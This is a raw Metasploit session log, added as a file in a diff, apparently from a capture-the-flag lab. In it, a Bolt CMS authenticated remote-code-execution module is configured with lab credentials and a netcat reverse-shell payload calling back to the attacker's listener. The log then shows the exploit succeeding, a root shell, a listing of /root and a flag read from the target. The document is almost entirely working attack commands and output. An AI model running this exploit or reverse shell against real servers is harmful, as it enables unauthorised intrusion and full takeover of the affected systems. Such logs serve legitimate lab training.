@@ -1,0 +1,86 @@
+msf5 exploit(unix/webapp/bolt_authenticated_rce) > show options 
+
+Module options (exploit/unix/webapp/bolt_authenticated_rce):
+
+   Name                 Current Setting        Required  Description
+   ----                 ---------------        --------  -----------
+   FILE_TRAVERSAL_PATH  ../../../public/files  yes       Traversal path from "/files" on the web server to "/root" on the server
+   PASSWORD                                    yes       Password to authenticate with
+   Proxies                                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS               10.10.138.124          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT                8000                   yes       The target port (TCP)
+   SRVHOST              0.0.0.0                yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT              8080                   yes       The local port to listen on.
+   SSL                  false                  no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI            /                      yes       Base path to Bolt CMS
+   URIPATH                                     no        The URI to use for this exploit (default is random)
+   USERNAME                                    yes       Username to authenticate with
+   VHOST                                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.9.18.54       yes       The listen address (an interface may be specified)
+   LPORT  1337             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   2   Linux (cmd)
+
+
+msf5 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
+USERNAME => bolt
+msf5 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
+PASSWORD => boltadmin123
+msf5 exploit(unix/webapp/bolt_authenticated_rce) > check
+[+] 10.10.138.124:8000 - The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "tkyv".
+
+[+] Reverted user profile back to original state.
+msf5 exploit(unix/webapp/bolt_authenticated_rce) > run
+
+[*] Started reverse TCP handler on 10.9.18.54:1337 
+[*] Executing automatic check (disable AutoCheck to override)
+[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "pnqu".
+[*] Found 4 potential token(s) for creating .php files.
+[+] Deleted file pfgkpdney.php.
+[+] Deleted file qrmvbrrn.php.
+[+] Deleted file qpckghmyee.php.
+[+] Used token fc7f7ee3bfd3001342ae73312b to create ebaeuqmekikk.php.
+[*] Attempting to execute the payload via "/files/ebaeuqmekikk.php?pnqu=`payload`"
+[*] Command shell session 1 opened (10.9.18.54:1337 -> 10.10.138.124:39876) at 2020-08-13 12:38:23 +0530
+[!] No response, may have executed a blocking payload!
+[+] Deleted file ebaeuqmekikk.php.
+[+] Reverted user profile back to original state.
+
+ls
+index.html
+pwd
+/home/bolt/public/files
+whoami
+root
+cd /root/
+ls
+ls -la
+total 36
+drwx------  5 root root 4096 Jul 18 19:54 .
+drwxr-xr-x 27 root root 4096 Jul 18 19:30 ..
+-rw-------  1 root root 2044 Jul 18 20:47 .bash_history
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwxr-xr-x  3 root root 4096 Jul 18 19:32 .composer
+drwxr-xr-x  3 root root 4096 Jul 18 19:50 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   66 Jul 18 19:53 .selected_editor
+drwx------  2 root root 4096 Jul 18 18:57 .ssh
+cd /
+find / -type f -name "flag.txt"         
+/home/flag.txt
+cat /home/flag.txt
+THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
+
+
